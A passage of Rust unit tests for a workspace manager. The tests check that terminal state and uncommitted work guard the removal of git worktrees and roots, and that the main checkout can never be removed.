    async fn a_starting_terminal_blocks_removal_same_as_a_running_one() {
        let (service, root, workspace) = fixture_with_workspace().await;
        assert!(
            service.inventory_snapshot().inventory_healthy,
            "this test needs a healthy inventory to mean anything"
        );

        let term = service
            .store
            .create_terminal(workspace.id, "shell", "shell", TerminalIntent::Running, 80, 24)
            .unwrap();
        let derived = service.derive_one(&term);
        assert_eq!(
            derived.state,
            TerminalState::Starting,
            "an unconfirmed terminal with no pane must derive as starting, not running, for \
             this test to prove what it claims to: {derived:?}"
        );

        match service.remove_root(root.id).await {
            Err(DomainError::RunningProcesses) => {}
            other => panic!("expected RunningProcesses for a starting terminal, got {other:?}"),
        }
    }
}

#[cfg(test)]
mod remove_worktree_tests {
    use super::*;

    /// Uncommitted work is the whole reason the typed confirmation exists;
    /// a worktree with none of it needs no typed name at all.
    #[tokio::test]
    async fn a_clean_worktree_needs_no_typed_confirmation() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        assert!(!svc.removal_needs_confirmation(ws.id).await.unwrap());
    }

    /// Uncommitted work is the whole reason the typed confirmation exists.
    #[tokio::test]
    async fn a_dirty_worktree_demands_the_name() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        std::fs::write(side.join("scratch.txt"), "work in progress").unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        assert!(svc.removal_needs_confirmation(ws.id).await.unwrap());
    }

    /// A worktree whose directory is already gone cannot be inspected for
    /// dirt, and there is nothing left in it to lose either way — so it must
    /// need no confirmation. This is deliberate: it is how a "worktree gone"
    /// row gets dismissed without ever asking for a name to type.
    #[tokio::test]
    async fn a_worktree_whose_directory_is_already_gone_needs_no_confirmation() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        std::fs::remove_dir_all(&side).unwrap();

        assert!(!svc.removal_needs_confirmation(ws.id).await.unwrap());
    }

    /// `remove_worktree` must refuse a `Starting` terminal exactly as it
    /// refuses a `Running` one, matching `remove_terminal`'s own guard. Built
    /// the same way `remove_root_tests::a_starting_terminal_blocks_removal_same_as_a_running_one`
    /// is: a terminal created through the store directly, with no live pane
    /// behind it, derives `Starting` rather than `Running` as long as the
    /// inventory itself is healthy.
    #[tokio::test]
    async fn a_starting_terminal_blocks_worktree_removal_same_as_a_running_one() {
        let (dir, svc, repo) = crate::test_support::fixture().await;
        let side = dir.path().join("side");
        git::git(
            &dir.path().join("repo"),
            &["worktree", "add", "-q", "-b", "feat/side", side.to_str().unwrap()],
        )
        .await
        .unwrap();
        crate::reconcile::repository(&svc, repo).await.unwrap();

        assert!(
            svc.inventory_snapshot().inventory_healthy,
            "this test needs a healthy inventory to mean anything"
        );

        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| !w.is_main_checkout)
            .unwrap();

        let term = svc
            .store
            .create_terminal(ws.id, "shell", "shell", TerminalIntent::Running, 80, 24)
            .unwrap();
        let derived = svc.derive_one(&term);
        assert_eq!(
            derived.state,
            TerminalState::Starting,
            "an unconfirmed terminal with no pane must derive as starting, not running, for \
             this test to prove what it claims to: {derived:?}"
        );

        match svc.remove_worktree(ws.id).await {
            Err(DomainError::RunningProcesses) => {}
            other => panic!("expected RunningProcesses for a starting terminal, got {other:?}"),
        }
    }

    /// The main checkout is refused by `ws.is_main_checkout`, a fact read
    /// straight from `git worktree list`, not by comparing paths.
    #[tokio::test]
    async fn the_main_checkout_is_never_removable() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| w.is_main_checkout)
            .unwrap();

        match svc.remove_worktree(ws.id).await {
            Err(DomainError::InvalidArgument { what }) => assert_eq!(what, "the main checkout"),
            other => panic!("expected InvalidArgument(\"the main checkout\"), got {other:?}"),
        }
    }

    /// The upgraded-database case: migration 0006 added `is_main_checkout`
    /// with `DEFAULT 0`, so a database written before this feature existed
    /// has the main checkout's row saying "not main" — and
    /// `set_workspace_is_main_checkout` is used here to put a row into
    /// exactly that state deliberately, standing in for that database,
    /// rather than relying on `ws.is_main_checkout` ever having been right.
    /// The path comparison in `remove_worktree` must refuse it anyway.
    ///
    /// Deleting that path check (and keeping only the `ws.is_main_checkout`
    /// guard above it) turns this red, since the row's flag is false here on
    /// purpose. Verified by hand.
    #[tokio::test]
    async fn a_wrong_flag_does_not_defeat_the_path_backstop() {
        let (_dir, svc, repo) = crate::test_support::fixture().await;
        let ws = svc
            .store
            .list_workspaces_for_repository(repo)
            .unwrap()
            .into_iter()
            .find(|w| w.is_main_checkout)
            .unwrap();

        let ws =
            svc.store.set_workspace_is_main_checkout(ws.id, ws.resource_version, false).unwrap();
        assert!(!ws.is_main_checkout, "the test must start from the wrong flag to mean anything");

        match svc.remove_worktree(ws.id).await {
            Err(DomainError::InvalidArgument { what }) => assert_eq!(what, "the main checkout"),
            other => panic!("expected InvalidArgument(\"the main checkout\"), got {other:?}"),
        }
    }

    // No test here for the unhealthy-inventory refusal (`TmuxUnavailable`).
    // `Service::inventory` is a concrete `LiveInventory`, not a trait object —
    // there is no seam to hand it a `FakeInventory::unavailable()` the way
    // `derive::tests` can for the pure derivation rule. Forcing it unhealthy
    // for real would mean starving or killing the private tmux server a
    // `fixture()` service just started, which is exactly the kind of live-tmux
    // dependency this task was told not to chase. The guard is exercised
    // instead by direct code inspection against `remove_root`'s identical
    // check, which this was copied from.
}
